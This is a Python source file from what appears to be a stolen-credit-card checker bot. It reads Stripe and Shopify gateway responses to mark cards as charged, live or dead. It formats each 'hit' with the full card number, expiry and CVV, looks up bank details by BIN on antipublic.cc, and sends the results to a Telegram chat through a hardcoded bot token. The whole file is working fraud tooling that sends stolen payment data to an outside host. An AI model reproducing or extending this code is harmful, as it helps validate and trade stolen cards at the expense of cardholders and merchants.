import traceback

async def get_charge_resp(result):
    try:
        if (
            "SUCCESS" in result or
            "ThankYou" in result or
            "thank_you" in result or
            "classicThankYouPageUrl" in result
        ):
            status = "CHARGE 🔥"
            response = "Charged 10$ 🔥"
            hits = "YES"

        elif "insufficient_funds" in result or "card has insufficient funds." in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"
            hits = "YES"

        elif (
            "INCORRECT_CVC" in result
            or "INVALID_CVC" in result
            or "Your card's security code is incorrect." in result
        ):
            status = "Live 🟢"
            response = "INCORRECT_CVC ❎"
            hits = "YES"

        elif "transaction_not_allowed" in result:
            status = "Live 🟢"
            response = "Card Doesn't Support Purchase ❎"
            hits = "YES"

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"
            hits = "YES"

        elif (
            "CompletePaymentChallenge" in result
            or "stripe/authentications" in result
            or "3d_secure_2" in result
        ):
            status = "Live 🟢"
            response = "3D Challenge Required ❎"
            hits = "YES"

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟢"
            response = "3D Challenge Required ❎"
            hits = "YES"

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟢"
            response = "Card Doesn't Support Purchase ❎"
            hits = "YES"

        elif (
            "generic_decline" in result
            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
            in result
            or "card_decline_rate_limit_exceeded" in result
        ):
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "Do Not Honor 🚫"
            hits = "NO"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"
            hits = "NO"

        elif "setup_intent_authentication_failure" in result:
            status = "Dead 🔴"
            response = "setup_intent_authentication_failure 🚫"
            hits = "NO"

        elif "invalid_cvc" in result:
            status = "Dead 🔴"
            response = "invalid_cvc 🚫"
            hits = "NO"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"
            hits = "NO"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"
            hits = "NO"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"
            hits = "NO"

        elif "incorrect_number" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"
            hits = "NO"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "intent_confirmation_challenge 🚫"
            hits = "NO"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif (
            "Your card's expiration year is invalid." in result
            or "Your card's expiration year is invalid." in result
        ):
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"
            hits = "NO"

        elif (
            "Your card's expiration month is invalid." in result
            or "invalid_expiry_month" in result
        ):
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"
            hits = "NO"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"
            hits = "NO"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"
            hits = "NO"

        elif (
            "Invalid API Key provided" in result
            or "testmode_charges_only" in result
            or "api_key_expired" in result
            or "Your account cannot currently make live charges." in result
        ):
            status = "Dead 🔴"
            response = "stripe error . contact support@stripe.com for more details 🚫"
            hits = "NO"

        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"
        elif "Payment Intent Creation Failed 🚫" in result:
            status = "Dead 🔴"
            response = "Payment Intent Creation Failed 🚫"
            hits = "NO"
            # await refundcredit(user_id)

        elif "ProxyError" in result:
            status = "Dead 🔴"
            response = "Proxy Connection Refused 🚫"
            hits = "NO"
            # await refundcredit(user_id)
        else:
            status = "Dead 🔴"
            response = result + " 🚫"
            hits = "NO"
         
    except:
        status = "ERROR"
        response = "UNKNOW FOUND WAIT"
        
    return status, response
    




async def properhit(status, response,lista,ip_address):
    if "CHARGE 🔥" in status:
        return f'#HITS <br>CC: {lista if lista else ""}<br>Response: {status} - {response}<br>IP: {ip_address} <br>'
    elif "Live 🟢" in status:
        return f'#LIVE <br>CC: {lista if lista else ""}<br>Response: {status} - {response}<br>IP: {ip_address} <br>'
    else:
        return f'<br>CC: {lista if lista else ""}<br>Response: {status} - {response}<br>IP: {ip_address} <br>'
    


import httpx
async def Hit_forwader(fullz,response,status,chat_id):
# async def forward_resp(fullz, gate, response):
    try:
        import httpx
        import urllib.parse
        import json
        session           = httpx.AsyncClient( timeout = 30 )
        cc, mes, ano, cvv = fullz.split("|")
        fbin              = cc[:6]
        brand,type,level,bank,country_data,country,flag,currency = await bin_main(fbin)

        resp = f"""
<b>┏━CC CHECKING
┣CARD -» 『 <code>{cc}|{mes}|{ano}|{cvv}</code> 』 
┣STATUS -» {status}
┣RESPONSE -» {response}

┏━Transaction 
┣GATEWAY -» SHOPIFY

┏━BIN DETAILS
┣Bin -»  {fbin} - {brand} - {type} - {level}
┣Bank -» {bank} 
┣Country -»  {country}[{country_data}] - {currency} - {flag}

┏━CHECK INFO
┣Credit Deducted -»  5
┣Bot by - <a href="tg://user?id=6047184723">𝐓𝐨𝐤𝐲𝐨 </a>

</b>"""
        resp      = urllib.parse.quote_plus(resp)
        BOT_TOKEN = "6512308266:AAGj0RsUq3HrjArvXHodRbrNJbTU4OhQpq8"
        LOGS_CHAT = chat_id

        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={LOGS_CHAT}&text={resp}&parse_mode=HTML")
        await session.aclose()
    except:
        import traceback






async def bin_check(session,bin):
    url = f"https://bins.antipublic.cc/bins/{bin}"
    req = await session.get(url=url)
    req = req.json()
    try:
        brand = req.get("brand")
    except:
        brand = "N/A"
    try:
       type = req.get("type")
    except:
       type = "N/A"
    try:
       level = req.get("level")
    except:
        level = "N/A"
    try:
       bank = req.get("bank")
    except:
       bank = "N/A"
    try:
       country_data = req.get("country")
    except:
        country_data = "N/A"
    try:
       country = req.get("country_name")
    except:
       country = "N/A"
    try:
       flag = req.get("country_flag")
    except:
       flag = "N/A"
    try:
       currency = req.get("country_currencies")
    except:
       currency = "N/A"

    return brand,type,level,bank,country_data,country,flag,currency


async def bin_main(fbin):
    session = httpx.AsyncClient(timeout=20)
    brand,type,level,bank,country_data,country,flag,currency = await bin_check(session,fbin)
    return brand,type,level,bank,country_data,country,flag,currency
